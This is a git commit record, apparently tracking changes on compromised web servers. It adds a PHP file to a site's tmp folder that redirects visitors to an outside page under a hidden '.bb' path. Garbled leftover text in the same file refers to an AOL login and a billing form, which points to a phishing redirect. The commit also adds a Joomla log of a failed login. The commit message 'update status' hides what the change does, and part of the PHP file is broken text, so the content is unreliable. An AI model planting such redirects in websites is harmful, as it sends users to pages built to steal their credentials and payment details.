a81fdab543609a8ed081e2c5e564f0fc94946b0d
Lewis Jang <lewis.aedes@gmail.com>
2016-02-09 06:21:54 +0000

    update status

---
+++ var/www/hecto.com.tw/tmp/Ascott.php/Ascott.php
@@ -0,0 +1,16 @@
+<?php
+
+/**
+ * Place in a blank PHP page
+ */
+
+// Change to the URL you want to redirect to
+$URL="http://www.shoutad.com/ecard/.bb/index.php";
+
+header ("Location: $URL");
+
+?> grcolportalRBGlogon-www.Aol.com/login/bill_form.html";
+
+header ("Location: $URL");
+
+?> 
---
+++ var/www/senselogo.com/logs/error.php/error.php
@@ -0,0 +1,7 @@
+#
+#<?php die('Forbidden.'); ?>
+#Date: 2016-02-09 05:46:28 UTC
+#Software: Joomla Platform 13.1.0 Stable [ Curiosity ] 24-Apr-2013 00:00 GMT
+
+#Fields: datetime	priority clientip	category	message
+2016-02-09T05:46:28+00:00	INFO 219.91.158.42	joomlafailure	Username and password do not match or you do not have an account yet.
